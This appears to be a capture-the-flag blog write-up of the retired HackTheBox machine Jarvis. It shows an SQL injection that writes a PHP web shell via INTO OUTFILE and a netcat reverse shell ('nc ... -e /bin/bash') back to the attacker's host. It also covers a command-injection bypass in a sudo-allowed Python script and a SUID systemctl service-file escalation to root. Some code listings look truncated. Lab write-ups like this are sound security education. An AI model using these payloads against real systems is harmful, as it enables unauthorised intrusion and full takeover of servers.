## Summary

Jarvis just retired today. Even though this is a medium box, I learned a lot from solving it, especially about `systemctl` and how I can abuse it to gain root privileges. Its IP address is `10.10.10.143` and I added it to `/etc/hosts` as `jarvis.htb` to make accessing the machine easier. Without further ado, letâ€™s jump right in!

## Scanning & Web App Enumeration

I always make a quick â€˜lightâ€™ scan with `nmap` so I can get to work quickly and a full one to see if there are any uncommon open ports. In this case, the ligh one was enough to get the initial foothold:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/jarvis# nmap -sV -O jarvis.htb -oN scan.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-05 08:57 EST

OpenSSH seemed to be up-to-date, so I decided to check port 80 for vulnerabilities.

<div>

</div>

The site looked like it was custom-made, so I decided to explore it more. After playing around for a bit, I discovered an interesting URL:

{% highlight bash %}
http://jarvis.htb/room.php?cod=1

{% endhighlight %}

<div>
<center><img src="/images/jarvis_htb_writeup/image-6-1024x509.png"></center>
</div>

Do you see the LFI? I did, too, but it turns out that was an SQL injection ðŸ™‚ A simple, working payload could be

{% highlight bash %}
http://jarvis.htb/room.php?cod=1;%20--

{% endhighlight %}

I wanted to do the SQL injection manually, so I started â€˜exhaustively searchingâ€™ for the number of columns. The `SELECT` statement worked with 7 entries, so the table probably had the same number of columns:

{% highlight bash %}
http://jarvis.htb/room.php?cod=7%20UNION%20SELECT%201,2,3,4,5,6,7;%20--

{% endhighlight %}

<div>
<center><img src="/images/jarvis_htb_writeup/image-7-1024x593.png"></center>
</div>

Now that we have a working SQL `SELECT` statement, we can insert anything in the results. I wanted to write a simple PHP shell in a file on the server and then use it to get a reverse shell. I tried writing using the `INTO OUTFILE` statement, and it worked. Also, since the target is most probably running Linux, I tried to write the file in the default webroot directory (`/var/www/html`):

{% highlight bash %}
http://jarvis.htb/room.php?cod=7%20UNION%20SELECT%201,%27%3C?php%20echo%20shell_exec($_GET[%22cmd%22]);?%3E%27,3,4,5,6,7%20INTO%20OUTFILE%20%27/var/www/html/yakuhito_shell.php%27%20;%20--

{% endhighlight %}

<div>
<center><img src="/images/jarvis_htb_writeup/image-8-1024x615.png"></center>
</div>

There was no output, which is normal because the SQL engine saves the query output to a file instead of passing it on to PHP. We can test that the query worked by trying to run a simple command on the server (`whoami`):

{% highlight bash %}
http://jarvis.htb/yakuhito_shell.php?cmd=whoami

{% endhighlight %}

<div>
<center><img src="/images/jarvis_htb_writeup/image-9.png"></center>
</div>

One thing that I learned from the OSCP course is to only value reverse shells, so I spawned one using netcat:

{% highlight bash %}
http://jarvis.htb/yakuhito_shell.php?cmd=nc%2010.10.15.147%20443%20-e%20/bin/bash

{% endhighlight %}

Itâ€™s also a good idea to upgrade the shell to a tty:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/jarvis# nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.15.147] from (UNKNOWN) [10.10.10.143] 50616
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@jarvis:/var/www/html$ 

{% endhighlight %}

## Exploiting simpler.py

Once I had a shell, I starter enumerating the machine. One thing that seemed odd was the `sudo` permission:

{% highlight bash %}
www-data@jarvis:/var/www/html$ sudo -l
sudo -l
Matching Defaults entries for www-data on jarvis:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on jarvis:
    (pepper : ALL) NOPASSWD: /var/www/Admin-Utilities/simpler.py
www-data@jarvis:/var/www/html$

{% endhighlight %}

The `www-data` user is allowed to run `/var/www/Admin-Utilities/simpler.py` as `pepper` without providing any password. I thought this might be the path to privesc, and I was right! I first tried to read the source code of the script:

{% highlight bash %}
www-data@jarvis:/var/www/html$ cat /var/www/Admin-Utilities/simpler.py
cat /var/www/Admin-Utilities/simpler.py
#!/usr/bin/env python3

{% endhighlight %}

What caught my attention was the exec_ping function, because it uses `os.system()` to call `ping`, which is VERY unsafe:

{% highlight python %}
def exec_ping():
    forbidden = ['&', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

{% endhighlight %}

The function is called when the program is being run with the `-p` switch. This means that we can execute any command given that we bypass the filter (our payload shouldnâ€™t contains any character present in the `forbidden` array).

My solution was pretty straightforward, but Iâ€™m not sure it was the intended one. We can use `$(command)` to execute a command, however, I found it easier to store the command into a file and execute it as a script, as `/` is not a blacklisted character.

{% highlight bash %}

Enter an IP:

{% endhighlight %}

The program hangs because the script needs to terminate before the ping command is executed. A reverse shell connected on port 444, so I added my SSH public key in the `~/.ssh/authorized_keys` file and connected using SSH:

{% highlight bash %}
root@fury-battlestation:~/htb/blog/jarvis# ssh pepper@jarvis.htb

pepper@jarvis:~$

{% endhighlight %}

We got user! I wonâ€™t display the fileâ€™s contents, but I can tell you that the proof starts with `2a` ðŸ™‚

## Exploiting systemctl

After getting the user flag, I started enumerating the machine again. While listing the SUID binaries, I noticed `systemctl` on the list:

{% highlight bash %}
pepper@jarvis:~$ find / -perm -4000 2> /dev/null
/bin/fusermount
/bin/mount
/bin/ping
/bin/systemctl
/bin/umount
/bin/su
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
pepper@jarvis:~$

{% endhighlight %}

This is odd because `systemctl` should be ran as the current user only. Instead, we can run it as its owner, `root`:

{% highlight bash %}
pepper@jarvis:~$ ls -la /bin/systemctl
-rwsr-x--- 1 root pepper 174520 Feb 17  2019 /bin/systemctl
pepper@jarvis:~$

{% endhighlight %}

`systemctl` is used to turn Linux services on and off. The basic idea of exploitation is to create a new service (which is just a file, as youâ€™ll see in a moment) and start it. Because `systemctl` is running as `root`, the service will be started as `root`.

_Note: I didnâ€™t come up with this method myself; I found it on_ [_gtfobins_](https://gtfobins.github.io/gtfobins/systemctl/)_._

First, I created a service file using the following commands:

{% highlight bash %}
pepper@jarvis:~$ echo '[Service]' > yakuhito.service
pepper@jarvis:~$ echo 'Type=oneshot' >> yakuhito.service
pepper@jarvis:~$ echo 'ExecStart=/bin/bash /tmp/yakuhito.sh' >> yakuhito.service
pepper@jarvis:~$ echo '[Install]' >> yakuhito.service
pepper@jarvis:~$ echo 'WantedBy=multi-user.target' >> yakuhito.service

{% endhighlight %}

I reused the `/tmp/yakuhito.sh` script, because I was now controlling the box via an SSH session and port 444 wasnâ€™t used anymore. The next step was to enable (or install) the service:

{% highlight bash %}
pepper@jarvis:~$ systemctl enable /home/pepper/yakuhito.service --now
Created symlink /etc/systemd/system/multi-user.target.wants/yakuhito.service â†’ /home/pepper/yakuhito.service.
Created symlink /etc/systemd/system/yakuhito.service â†’ /home/pepper/yakuhito.service.

{% endhighlight %}

The shell hung and a reverse shell connected on port 444.

{% highlight bash %}
root@fury-battlestation:~/htb/blog/jarvis# nc -nvlp 444
listening on [any] 444 ...
connect to [10.10.14.140] from (UNKNOWN) [10.10.10.143] 49288
python -c 'import pty; pty.spawn("/bin/bash")'
root@jarvis:/# whoami && id && hostname
whoami && id && hostname
root
uid=0(root) gid=0(root) groups=0(root)
jarvis
root@jarvis:/# wc /root/root.txt
wc /root/root.txt
 1  1 33 /root/root.txt
root@jarvis:/# 

{% endhighlight %}

Again, I will not put the entire flag here, but I will tell you that it starts with `d4` ðŸ˜‰
